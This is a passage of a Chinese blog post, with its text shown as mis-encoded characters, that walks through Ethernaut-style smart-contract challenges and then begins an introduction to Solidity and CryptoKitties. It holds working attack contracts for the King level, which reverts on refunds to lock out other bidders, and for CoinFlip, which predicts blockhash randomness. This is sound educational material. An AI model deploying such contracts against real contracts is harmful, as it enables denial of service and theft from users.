<li>åªä¼šä¼ é€’éƒ¨åˆ† Gas ä¾›è°ƒç”¨ï¼Œé˜²æ­¢é‡å…¥ï¼ˆreentrancyï¼‰</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;address&gt;.call.value()()</span><br></pre></td></tr></table></figure>

<ul>
<li>å½“å‘é€å¤±è´¥æ—¶ä¼šè¿”å› false</li>
<li>ä¼ é€’æ‰€æœ‰å¯ç”¨ Gas ä¾›è°ƒç”¨ï¼Œä¸èƒ½æœ‰æ•ˆé˜²æ­¢é‡å…¥ï¼ˆreentrancyï¼‰</li>
</ul>
<p>å½“æˆ‘ä»¬æˆä¸º King ä¹‹åï¼Œå¦‚æœæœ‰äººå‡ºä»·æ¯”æˆ‘ä»¬é«˜ï¼Œä¼šé¦–å…ˆæŠŠé’±é€€å›ç»™æˆ‘ä»¬ï¼Œä½¿ç”¨çš„æ˜¯ <code>transfer()</code>ã€‚ä¸Šé¢æåˆ°ï¼Œå½“ <code>transfer()</code> è°ƒç”¨å¤±è´¥æ—¶ä¼šå›æ»šçŠ¶æ€ï¼Œé‚£ä¹ˆå¦‚æœåˆçº¦åœ¨é€€é’±è¿™ä¸€æ­¥éª¤ä¸€ç›´è°ƒç”¨å¤±è´¥çš„è¯ï¼Œä»£ç å°†æ— æ³•ç»§ç»­å‘ä¸‹è¿è¡Œï¼Œå…¶ä»–äººå°±æ— æ³•æˆä¸ºæ–°çš„ Kingã€‚</p>
<p>éƒ¨ç½²ä¸€ä¸ªæ–°çš„åˆçº¦ï¼Œå½“æ”¶åˆ°è½¬è´¦æ—¶ä¸»åŠ¨æŠ›å‡ºé”™è¯¯ã€‚</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    address instance_address = instance_address_here;</span><br><span class="line"></span><br><span class="line">    function Attack() payable&#123;&#125;</span><br><span class="line"></span><br><span class="line">    function hack() public &#123;</span><br><span class="line">        instance_address.call.value(1.1 ether)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function () public &#123;</span><br><span class="line">        revert();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>\7. Bad Randomness - å¯é¢„æµ‹çš„éšæœºå¤„ç†</p>
<p>ä¼ªéšæœºé—®é¢˜ä¸€ç›´éƒ½å­˜åœ¨äºç°ä»£è®¡ç®—æœºç³»ç»Ÿä¸­ï¼Œä½†æ˜¯åœ¨å¼€æ”¾çš„åŒºå—é“¾ä¸­ï¼Œåƒåœ¨ä»¥å¤ªåŠæ™ºèƒ½åˆçº¦ä¸­ç¼–å†™çš„åŸºäºéšæœºæ•°çš„å¤„ç†é€»è¾‘æ„Ÿè§‰å°±æœ‰ç‚¹ä¸åˆ‡å®é™…äº†ï¼Œç”±äºäººäººéƒ½èƒ½è®¿é—®é“¾ä¸Šæ•°æ®ï¼Œåˆçº¦ä¸­çš„å­˜å‚¨æ•°æ®éƒ½èƒ½åœ¨é“¾ä¸ŠæŸ¥è¯¢åˆ†æå¾—åˆ°ã€‚å¦‚æœåˆçº¦ä»£ç æ²¡æœ‰ä¸¥æ ¼è€ƒè™‘åˆ°é“¾ä¸Šæ•°æ®å…¬å¼€çš„é—®é¢˜å»ä½¿ç”¨éšæœºæ•°ï¼Œå¯èƒ½ä¼šè¢«æ”»å‡»è€…æ¶æ„åˆ©ç”¨æ¥è¿›è¡Œ â€œä½œå¼Šâ€ã€‚</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">  function CoinFlip() public &#123;</span><br><span class="line">    consecutiveWins = 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">    uint256 blockValue = uint256(block.blockhash(block.number-1));</span><br><span class="line"></span><br><span class="line">    if (lastHash == blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash = blockValue;</span><br><span class="line">    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);</span><br><span class="line">    bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">    if (side == _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      return true;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      consecutiveWins = 0;</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é€šå…³æ¡ä»¶</p>
<ul>
<li>è¿ç»­çŒœå¯¹ 10 æ¬¡</li>
</ul>
<p><code>FACTOR</code> ä¸º 2^255ï¼Œ<code>coinFlip</code> ç»“æœåªä¼šä¸º 1 æˆ– 0<br>ç›¸å½“äºä¸€ä¸ªçŒœç¡¬å¸æ­£åé¢çš„æ¸¸æˆ</p>
<p>è¿™æ˜¯ç»å…¸çš„åŒºå—é“¾ä¼ªéšæœºæ•°çš„é—®é¢˜ã€‚<br>åœ¨ä»¥å¤ªåŠæ™ºèƒ½åˆçº¦ä¸­ç¼–å†™çš„åŸºäºéšæœºæ•°çš„å¤„ç†é€»è¾‘æ˜¯ååˆ†å±é™©çš„ï¼Œå› ä¸ºåŒºå—é“¾ä¸Šçš„æ•°æ®æ˜¯å…¬å¼€çš„ï¼Œæ‰€æœ‰äººéƒ½å¯ä»¥çœ‹è§ï¼Œåˆ©ç”¨å…¬å¼€çš„æ•°æ®æ¥ç”Ÿæˆéšæœºæ•°æ˜¯ä¸æ˜æ™ºçš„ã€‚<br>æ­¤å¤–ï¼Œåƒ <code>timestamps</code> è¿™æ ·çŸ¿å·¥å¯æ§çš„æ•°æ®ä¹Ÿä¸å®œä½œä¸ºç§å­ã€‚</p>
<p>åœ¨è¿™é“é¢˜ä¸­ï¼Œå‡ºé¢˜äººåˆ©ç”¨ <code>block.blockhash(block.number-1)</code> æ¥ç”Ÿæˆéšæœºæ•°ï¼Œè¿™æ˜¯å¯é¢„æµ‹çš„ã€‚æˆ‘ä»¬å¯ä»¥éƒ¨ç½²ä¸€ä¸ªæ–°çš„åˆçº¦ï¼Œå…ˆè¿›è¡Œéšæœºæ•°çš„é¢„æµ‹ï¼Œå†è¿›è¡Œç«çŒœã€‚</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">  function CoinFlip() public &#123;</span><br><span class="line">    consecutiveWins = 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">    uint256 blockValue = uint256(block.blockhash(block.number-1));</span><br><span class="line"></span><br><span class="line">    if (lastHash == blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash = blockValue;</span><br><span class="line">    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);</span><br><span class="line">    bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">    if (side == _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      return true;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      consecutiveWins = 0;</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">  CoinFlip fliphack;</span><br><span class="line">  address instance_address = instance_address_here;</span><br><span class="line">  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">  function Attack() &#123;</span><br><span class="line">    fliphack = CoinFlip(instance_address);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function predict() public view returns (bool)&#123;</span><br><span class="line">    uint256 blockValue = uint256(block.blockhash(block.number-1));</span><br><span class="line">    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);</span><br><span class="line">    return coinFlip == 1 ? true : false;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function hack() public &#123;</span><br><span class="line">    bool guess = predict();</span><br><span class="line">    fliphack.flip(guess);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åªéœ€è°ƒç”¨ 10 æ¬¡ <code>hack()</code> å‡½æ•°å³å¯ã€‚</p>
<p>P.S.</p>
<ol>
<li>é‡ä¸Šäº†meatamask æ— é™è½¬åœˆçš„é—®é¢˜ï¼Œæœ€åå‘ç°æ˜¯ç‰ˆæœ¬é—®é¢˜ï¼Œä¸‹è½½ä¸€ä¸ªè€ç‰ˆæœ¬å°±è¡Œã€‚ä½†æ˜¯extension storeæ²¡æœ‰è€ç‰ˆæœ¬ï¼Œåæ¥è¿˜æ˜¯githubä¸Šå‘ç°ï¼Œåœ¨chrome:&#x2F;&#x2F;extensionså³ä¸Šè§’æ‰“å¼€å¼€å‘è€…æ¨¡å¼ï¼Œç„¶åå¯ä»¥é€‰æ‹©æ–‡ä»¶å¤¹ã€‚</li>
</ol>
<p><strong>å‚è€ƒï¼š</strong></p>
<ol>
<li><a href="https://link.zhihu.com/?target=https://blog.sigmaprime.io/solidity-security.html">Solidity Security: Comprehensive list of known attack vectors and common anti-patterns</a></li>
<li><a href="https://link.zhihu.com/?target=https://github.com/slowmist/Knowledge-Base/blob/master/solidity-security-comprehensive-list-of-known-attack-vectors-and-common-anti-patterns-chinese.md">https://github.com/slowmist/Knowledge-Base/blob/master/solidity-security-comprehensive-list-of-known-attack-vectors-and-common-anti-patterns-chinese.md</a></li>
<li><a href="https://link.zhihu.com/?target=https://blog.csdn.net/TurkeyCock/article/details/80485391">ä»¥å¤ªåŠäº¤æ˜“æºç åˆ†æ - é‘«é‘«ç‚¹ç¯ - CSDNåšå®¢</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.anquanke.com/post/id/148341">https://www.anquanke.com/post/id/148341</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.colabug.com/4089704.html">Ethernaut Lvl 0 Walkthrough: ABIs, Web3, and how to abuse them</a></li>
<li><a href="https://link.zhihu.com/?target=https://ethfans.org/ajian1984/articles/32320">å¹²è´§ | Solidity å®‰å…¨ï¼šå·²çŸ¥æ”»å‡»æ–¹æ³•å’Œå¸¸è§é˜²å¾¡æ¨¡å¼ç»¼åˆåˆ—è¡¨ï¼ŒPart-1ï¼šå¯é‡å…¥æ¼æ´ã€ç®—æ³•ä¸Šä¸‹æº¢å‡º</a></li>
<li><a href="https://link.zhihu.com/?target=https://paper.seebug.org/632/">Solidity å®‰å…¨ï¼šå·²çŸ¥æ”»å‡»æ–¹æ³•å’Œå¸¸è§é˜²å¾¡æ¨¡å¼ç»¼åˆåˆ—è¡¨</a></li>
<li><a href="https://link.zhihu.com/?target=http://www.cnblogs.com/iamstudy/articles/ethernaut_game_wp_1.html">æ™ºèƒ½åˆçº¦ - Ethernaut Gameï¼ˆä¸Šï¼‰</a></li>
<li><a href="https://link.zhihu.com/?target=https://github.com/trufflesuite/truffle-contract%23sending-ether--triggering-the-fallback-function">trufflesuite&#x2F;truffle-contract</a></li>
<li><a href="https://link.zhihu.com/?target=http://orchome.com/966">ä»¥å¤ªåŠABIä»‹ç» - OrcHome</a></li>
<li><a href="https://link.zhihu.com/?target=https://learnblockchain.cn/2018/08/09/understand-abi/">å¦‚ä½•ç†è§£ä»¥å¤ªåŠABI - åº”ç”¨ç¨‹åºäºŒè¿›åˆ¶æ¥å£</a></li>
<li><a href="https://link.zhihu.com/?target=http://remix.ethereum.org/%23optimize=true&version=soljson-v0.4.25+commit.59dbf8f1.js">http://remix.ethereum.org/#optimize=true&version=soljson-v0.4.25+commit.59dbf8f1.js</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.jianshu.com/p/304b99bfef3d">metamask æ— é™è½¬åœˆ loading</a></li>
<li><a href="https://link.zhihu.com/?target=https://paper.seebug.org/601/">ä»¥å¤ªåŠæ™ºèƒ½åˆçº¦å®‰å…¨å…¥é—¨äº†è§£ä¸€ä¸‹ï¼ˆä¸Šï¼‰</a></li>
<li><a href="https://link.zhihu.com/?target=https://paper.seebug.org/607/">ä»¥å¤ªåŠæ™ºèƒ½åˆçº¦å®‰å…¨å…¥é—¨äº†è§£ä¸€ä¸‹ï¼ˆä¸‹ï¼‰</a></li>
<li><a href="https://link.zhihu.com/?target=https://ethereum.stackexchange.com/questions/3667/difference-between-call-callcode-and-delegatecall">Difference between CALL, CALLCODE and DELEGATECALL</a></li>
<li><a href="https://link.zhihu.com/?target=https://ethfans.org/posts/how-to-build-updateable-smart-contract-part-1">æ•™ç¨‹ | åœ¨åŒºå—é“¾ä¸Šå»ºç«‹å¯æ›´æ–°çš„æ™ºæ…§åˆçº¦(ä¸€)</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.anquanke.com/post/id/152590">Solidityä¸­çš„delegatecallæ‚è°ˆ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å°</a></li>
<li><a href="https://link.zhihu.com/?target=https://www.bubbles966.cn/blog/2018/05/07/analyse_dapp_by_ethernaut_2/">ä»Ethernautå­¦ä¹ æ™ºèƒ½åˆçº¦å®¡è®¡(äºŒ) - Bubbles~blog</a></li>
<li><a href="https://link.zhihu.com/?target=https://medium.com/loom-network/how-to-secure-your-smart-contracts-6-solidity-vulnerabilities-and-how-to-avoid-them-part-2-730db0aa4834">https://medium.com/loom-network/how-to-secure-your-smart-contracts-6-solidity-vulnerabilities-and-how-to-avoid-them-part-2-730db0aa4834</a></li>
</ol>
<h1 id="åŒºå—é“¾æŠ€æœ¯14-æ™ºèƒ½åˆçº¦å’Œsolidityç®€ä»‹"><a href="#åŒºå—é“¾æŠ€æœ¯14-æ™ºèƒ½åˆçº¦å’Œsolidityç®€ä»‹" class="headerlink" title="åŒºå—é“¾æŠ€æœ¯14:æ™ºèƒ½åˆçº¦å’Œsolidityç®€ä»‹"></a>åŒºå—é“¾æŠ€æœ¯14:æ™ºèƒ½åˆçº¦å’Œsolidityç®€ä»‹</h1><p>é¦–å…ˆè¦å¼ºè°ƒçš„æ˜¯ï¼Œä»¥å¤ªåŠå’Œæ¯”ç‰¹å¸çš„åŒºåˆ«ã€‚æ¯”ç‰¹å¸ä¸»è¦ç”¨é€”æ˜¯ç”¨äºè¿›è¡Œäº¤æ˜“ï¼Œå®šä½æ˜¯æ•°å­—è´§å¸çš„æ”¯ä»˜åŠŸèƒ½ã€‚ä»¥å¤ªåŠç›¸æ¯”æ¯”ç‰¹å¸æ˜¯ä¸€ä¸ªå·¨å¤§çš„æå‡ï¼Œå°†åŒºå—é“¾çš„åº”ç”¨è¾¹ç•Œä»è´§å¸å’Œæ”¯ä»˜æ‰©å¤§åˆ°äº†æ›´å¹¿çš„é¢†åŸŸï¼ˆé€šè¿‡æ™ºèƒ½åˆçº¦å®ç°ï¼‰ã€‚</p>
<p>åŒºå—é“¾2.0æ˜¯æ›´å®è§‚çš„å¯¹æ•´ä¸ªå¸‚åœºå»ä¸­å¿ƒåŒ–ï¼Œåˆ©ç”¨åŒºå—é“¾æŠ€æœ¯æ¥è½¬æ¢è®¸å¤šä¸åŒçš„æ•°å­—èµ„äº§ï¼Œé€šè¿‡è½¬è®©æ¥åˆ›å»ºä¸åŒèµ„äº§çš„ä»·å€¼ã€‚åŒºå—é“¾æŠ€æœ¯çš„å»ä¸­å¿ƒåŒ–è´¦æœ¬åŠŸèƒ½å¯ä»¥è¢«ç”¨æ¥åˆ›å»ºã€ç¡®è®¤ã€è½¬ç§»å„ç§ä¸åŒç±»å‹çš„èµ„äº§åŠåˆçº¦ã€‚å‡ ä¹æ‰€æœ‰ç±»å‹çš„é‡‘èäº¤æ˜“éƒ½å¯ä»¥è¢«æ”¹é€ æˆåœ¨åŒºå—é“¾ä¸Šä½¿ç”¨ï¼ŒåŒ…æ‹¬è‚¡ç¥¨ã€ç§å‹Ÿè‚¡æƒã€ä¼—ç­¹ã€å€ºåˆ¸å’Œå…¶ä»–ç±»å‹çš„é‡‘èè¡ç”Ÿå“å¦‚æœŸè´§ã€æœŸæƒç­‰ã€‚</p>
<p>é‚£ä»€ä¹ˆæ˜¯æ™ºèƒ½åˆçº¦å‘¢ï¼Ÿ</p>
<p>æ™ºèƒ½åˆçº¦ä¸æ˜¯ä¸€å®šè¦ç”¨åŒºå—é“¾æ¥å®ç°ï¼Œå¾ˆä¹…ä¹‹å‰å°±å·²ç»å‡ºç°äº†ï¼šæ¯”å¦‚å¾®ä¿¡å’Œæ”¯ä»˜å®çš„ä¿¡ç”¨å¡è‡ªåŠ¨è¿˜æ¬¾ï¼Œä¹Ÿæ˜¯ä¸€ç§æ™ºèƒ½åˆçº¦ã€‚å½“è¿˜æ¬¾æ—¥åˆ°äº†ï¼Œè¿˜æ¬¾æ¡ä»¶ä¹Ÿæ»¡è¶³ï¼ˆæ”¯ä»˜å®çš„ä½™é¢å®ã€å¾®ä¿¡æ”¯ä»˜ä½™é¢æˆ–è€…é“¶è¡Œå‚¨è“„å¡ä¸­ä½™é¢å……è¶³ï¼‰ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨è¿›è¡Œè¿˜æ¬¾ï¼Œè¿™äº›éƒ½æ˜¯æ™ºèƒ½åˆçº¦ï¼Œä¹Ÿæ²¡æœ‰ä½¿ç”¨åŒºå—é“¾æŠ€æœ¯ã€‚</p>
<p>è€Œä½¿ç”¨åŒºå—é“¾çš„è¯ï¼Œç»“åˆä¸å¯ç¯¡æ”¹æ•°æ®æ— æ³•åˆ é™¤ã€ä¿®æ”¹ï¼Œåªèƒ½æ–°å¢ï¼Œä¿è¯äº†å†å²çš„å¯è¿½æº¯ï¼ŒåŒæ—¶ä½œæ¶çš„æˆæœ¬å°†å¾ˆé«˜ï¼Œå› ä¸ºå…¶ä½œæ¶è¡Œä¸ºå°†è¢«æ°¸è¿œè®°å½•ï¼ŒåŒæ—¶æ‹¥æœ‰é«˜å¯é æ€§ï¼Œç”¨æˆ·ä¸ç”¨æ‹…å¿ƒç³»ç»Ÿåœ¨æ¡ä»¶è¢«æ»¡è¶³æ—¶ä¸æ‰§è¡Œåˆçº¦ï¼›ç„¶åå°±æ˜¯å»ä¸­å¿ƒåŒ–å¸¦æ¥çš„å…¨ç½‘å¤‡ä»½ï¼Œå®Œå¤‡çš„è®°å½•å®Œå…¨å¯ä»¥æ”¯æŒæ”¯æŒäº‹åçš„å®¡è®¡ï¼Œé¿å…äº†ä¸­å¿ƒåŒ–å› ç´ çš„å½±å“ã€‚æ‰€ä»¥å¯ä»¥æƒ³è±¡ï¼Œä»¥å¤ªåŠé€šè¿‡åœ¨åŒºå—é“¾ä¸Šæä¾›äº†å›¾çµå®Œå¤‡è¯­è¨€ï¼Œæ‰“å¼€äº†å¤šä¹ˆå¤§çš„ä¸€ä¸ªå¸‚åœºã€‚</p>
<p>ä¸¾ä¸€ä¸ªä¾‹å­ï¼Œçœ‹çœ‹ä»¥å¤ªåŠä¸Šçš„åº”ç”¨ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233109.jpg" alt="img"></p>
<p>è°œæ‹çŒ«æ˜¯ä¸–ç•Œé¦–æ¬¾åŒºå—é“¾æ¸¸æˆã€‚â€œåŒºå—é“¾â€æ˜¯æ”¯æŒç±»ä¼¼æ¯”ç‰¹å¸è¿™æ ·çš„åŠ å¯†è´§å¸çš„è¿ä½œæŠ€æœ¯åŸºç¡€ã€‚å°½ç®¡è°œæ‹çŒ«ä¸æ˜¯æ•°å­—è´§å¸ï¼Œä½†å®ƒä¹Ÿèƒ½æä¾›åŒæ ·çš„å®‰å…¨ä¿éšœï¼šæ¯ä¸€åªè°œæ‹çŒ«éƒ½æ˜¯ç‹¬ä¸€æ— äºŒçš„ï¼Œè€Œä¸”100%å½’ç”¨æˆ·æ‰€æœ‰ã€‚å®ƒæ— æ³•è¢«å¤åˆ¶ã€æ‹¿èµ°ã€æˆ–é”€æ¯ã€‚</p>
<p>è¿·æ‹çŒ«å®˜æ–¹å°†ä»–ä»¬è®¾è®¡çš„è¿·æ‹çŒ«åˆçº¦å‘å¸ƒåˆ°äº†ä»¥å¤ªåŠä¸Šï¼Œå¹¶å…¬å¸ƒäº†åˆçº¦å†…å®¹ï¼Œå…¶ä¸­è§„å®šäº†0ä»£çŒ«åªèƒ½æœ‰ä»–ä»¬çš„CEOã€COOæ¥äº§ç”Ÿï¼Œå¹¶é™å®šçš„0ä»£çŒ«æœ€å¤šäº§ç”Ÿçš„æ•°é‡ï¼Œä»¥åŠç©å®¶ä¹‹é—´å¦‚ä½•äº¤æ˜“çŒ«ï¼Œä¸¤åªçŒ«å’ªä¹‹é—´å¦‚ä½•ç¹è‚²ã€çŒ«å’ªå¤‡å­•å‘¨æœŸç­‰ç­‰è§„åˆ™ï¼Œä»¥ä¸Šè§„åˆ™å·²ç»åœ¨ä»¥å¤ªåŠä¸Šåšäº†å…¬è¯ï¼Œä»¥ååªèƒ½æŒ‰ç…§è¿™å¥—è§„åˆ™æ¥è¿›è¡Œæ¸¸æˆã€‚<br>åœ¨åŒºå—é“¾å¹³å°ä¸Šçš„æ¯åªçŒ«å’ªå…¶å®åªæ˜¯å­˜åœ¨ä»¥å¤ªåŠä¸­çš„ä¸€æ®µçŒ«å’ªåŸºå› ç¼–ç ï¼Œè¯¥æ®µåŸºå› ç¼–ç å†³å®šäº†çŒ«å’ªçš„å±æ€§ã€å¤–è²Œç­‰ï¼Œè¿·æ‹çŒ«å®˜æ–¹åœ¨ä»¥å¤ªåŠä¹‹å¤–ï¼Œæä¾›äº†ä¸€ä¸ªç½‘ç«™ï¼Œåœ¨ç½‘ç«™ä¸Šå°†è¿™äº›çŒ«å’ªæ ¹æ®å…¶åŸºå› ç¼–ç å±•ç¤ºå‡ºæ¥ã€‚ç©å®¶å¯ä»¥ä½¿ç”¨è‡ªå·±çš„ä»¥å¤ªåŠå¸æˆ·å»è´­ä¹°è¿™äº›çŒ«å’ªï¼Œå¹¶å°†è‡ªå·±çš„çŒ«å’ªå»ä¸å…¶ä»–ç©å®¶çš„çŒ«å’ªç¹è‚²ä»¥äº§ç”Ÿä¸‹ä¸€ä»£çŒ«å’ªï¼Œæˆ–è€…ç»§ç»­å°†å…¶æ‹å–ï¼ŒçŒ«å’ªä¹‹é—´ç¹è‚²ä¹‹åäº§ç”Ÿçš„ä¸‹ä¸€ä»£çŒ«å’ªï¼Œå…¶åŸºå› ç¼–ç æ˜¯å—å…¶ä¸¤åªä¸Šä¸€ä»£çŒ«å’ªåŸºå› ç¼–ç å½±å“çš„ï¼Œç”±äºçŒ«å’ªçš„åŸºå› ç¼–ç åœ¨ä»¥å¤ªåŠä¸Šéƒ½æ˜¯å…¬å¼€çš„ï¼Œæ‰€ä»¥è¿·æ‹çŒ«å®˜æ–¹å¹¶æœªå…¬å¸ƒä¸‹ä¸€ä»£åŸºå› ç¼–ç çš„ç”Ÿæˆè§„åˆ™ï¼Œè¿™æ ·ç©å®¶ä¹Ÿæ— æ³•äººä¸ºçš„æ§åˆ¶ï¼Œä½¿ç”¨ä¸¤åªç‰¹å®šåŸºå› çš„çŒ«æ¥ç¹è‚²å‡ºå…·æœ‰ç‰¹å®šç¨€æœ‰å±æ€§çš„ä¸‹ä¸€ä»£ã€‚ ç©å®¶åœ¨ä»¥å¤ªåŠçš„å¸æˆ·æ˜¯ç”±ä¸€æ®µç‰¹æ®Šçš„å¯†é’¥ä¿æŠ¤çš„ï¼Œç©å®¶è¿›è¡Œè´­ä¹°çŒ«å’ªã€ç¹è‚²çŒ«å’ªæ“ä½œäº‹ï¼Œè¿™äº›æ“ä½œä¿¡æ¯éƒ½ä¼šè¢«å‘å¸ƒåˆ°ä»¥å¤ªåŠä¸Šæ—¶ï¼Œå¹¶ä¸”è¿™äº›æ“ä½œè¡Œä¸ºéƒ½ä¼šä½¿ç”¨ç©å®¶çš„å¯†é’¥è¿›è¡Œè®¤è¯ï¼Œå¹¶åœ¨ä»¥å¤ªåŠä¸Šè®°å½•ï¼Œå…¶å…¬ä¹‹äºä¼—ã€‚æ‰€ä»¥æ‰€æœ‰äººéƒ½å¯ä»¥çœ‹åˆ°ç©å®¶Aä¹°äº†ä¸€åªçŒ«å’ªKitty101ï¼Œç©å®¶Bå°†ä»–çš„çŒ«å’ªKitty201ä¸ä»–çš„Kitty202è¿›è¡Œäº†ç¹è‚²ï¼Œå¹¶ç”Ÿä¸‹äº†ä¸€åªä»€ä¹ˆæ ·åŸºå› çš„Kitty301ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233110.jpg" alt="img"></p>
<p>åœ¨æ­¤ä¹‹åï¼ŒåŒºå—é“¾ä¸Šå‘å¸ƒäº†ä¸å°‘æ¸¸æˆï¼Œè€Œä»Šå¹´æš‘å‡çš„ä¸¤æ¬¾æ¸¸æˆï¼ˆFomo3då’ŒLastWinnerï¼‰å¸å¼•äº†å¤§é‡çš„çœ¼çƒï¼ŒåŒæ—¶ä¹Ÿå¯èƒ½é¢„ç¤ºç€åœ¨ä»¥å¤ªåŠä¸Šæ¸¸æˆå¼€å‘çš„æ²¡è½ã€‚Fomo3dçš„é»‘å®¢æ”»å‡»æŠ€å·§å¯ä»¥å‚çœ‹<a href="https://link.zhihu.com/?target=https://wallstreetcn.com/articles/3393395">1</a>å’Œ<a href="https://link.zhihu.com/?target=https://www.jianshu.com/p/4c926fbbdafd">2</a>ã€‚</p>
<p>é‚£ç”±æ­¤å¯ä»¥çœ‹åˆ°ï¼Œæ¯”å¤ªå¸å’Œä»¥å¤ªåŠåº•å±‚æ¡†æ¶æœ¬èº«ï¼Œå½“å‰æ”»å‡»è¾ƒå°‘ï¼›ä½†æ˜¯åœ¨ä»¥å¤ªåŠä¸Šï¼Œæ™ºèƒ½åˆçº¦æœ¬èº«çš„ä»£ç é—®é¢˜æ˜¯å®‰å…¨çš„é‡ç¾åŒºã€‚</p>
<p>é‚£æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬è®¨è®ºä¸‹ï¼Œsolodityè¯­è¨€ï¼Œå¯¹æ™ºèƒ½åˆçº¦æœ‰ä¸€ä¸ªåŸºæœ¬çš„äº†è§£ã€‚</p>
<p>æˆ‘ä»¬ä½¿ç”¨åœ¨çº¿çš„<a href="https://link.zhihu.com/?target=http://remix.ethereum.org/">remix IDE</a>æ¥æŸ¥çœ‹æ™ºèƒ½åˆçº¦çš„æ•ˆæœã€‚</p>
<p>é¦–å…ˆçœ‹æœ€åŸºæœ¬çš„è¯­æ³•å’Œä½¿ç”¨æƒ…å†µã€‚</p>
<ol>
<li>test_2.sol æœ€åŸºæœ¬çš„ç”¨æ³•</li>
</ol>
<p>ä»¥ä¸‹çš„ä»£ç ä¸­ï¼Œé™¤äº†ç¬¬ä¸€è¡Œå’Œç¬¬äºŒè¡Œä¸­çš„contractï¼Œå…¶å®å°±å’Œå…¶ä»–æˆ‘ä»¬æ¯”è¾ƒç†Ÿæ‚‰çš„è¯­è¨€å·®ä¸å¤šã€‚å°†ä»£ç æ‹·è´åˆ°remixä¹‹ä¸­ï¼Œç„¶ådeployåˆ°é“¾ä¸Šå»ï¼Œå°±æ˜¯æ™ºèƒ½åˆçº¦äº†ã€‚</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line">contract C &#123;</span><br><span class="line">    //äº¤æ¢ä¼ å…¥å€¼çš„é¡ºåºå¹¶è¿”å›</span><br><span class="line">    function f(uint key, uint value) returns (uint, uint)&#123; </span><br><span class="line">        return (value, key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function g() public view returns (uint, uint)&#123;</span><br><span class="line">        //ä»»æ„é¡ºåºçš„é€šè¿‡å˜é‡åæ¥æŒ‡å®šå‚æ•°å€¼</span><br><span class="line">        return f(&#123;value: 2, key: 1&#125;);//2,1</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function h() public view returns (uint)&#123;</span><br><span class="line">        uint a = 3;</span><br><span class="line">        uint b = 4;</span><br><span class="line">        return a+b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233111.jpg" alt="img"></p>
